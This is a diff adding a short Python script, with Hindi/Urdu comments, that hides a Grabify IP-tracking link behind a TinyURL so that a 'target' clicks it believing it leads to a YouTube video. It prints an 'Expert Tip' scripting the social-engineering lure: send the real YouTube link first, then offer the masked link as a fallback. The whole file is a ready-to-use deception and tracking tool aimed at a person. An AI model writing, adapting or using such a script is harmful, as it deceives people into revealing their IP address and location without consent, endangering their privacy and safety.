@@ -1,0 +1,18 @@
+import pyshorteners
+
+def create_smart_link(tracking_url, destination_url):
+    s = pyshorteners.Shortener()
+    # Masking the tracking link
+    masked_link = s.tinyurl.short(tracking_url)
+    
+    print(f"\n[+] Target will see: {destination_url}")
+    print(f"[+] Your Tracking Link (Hidden): {masked_link}")
+    print(f"\n[!] Expert Tip: Send the YouTube link first, then say 'Sorry, use this short link if that doesn't work: {masked_link}'")
+
+# Aapka Grabify link
+my_tracking = "https://grabify.link/NWP8TK" 
+# Wo video jo click ke baad khulegi
+final_video = "https://youtu.be/Gz07qzebSxE" 
+
+create_smart_link(my_tracking, final_video)
+
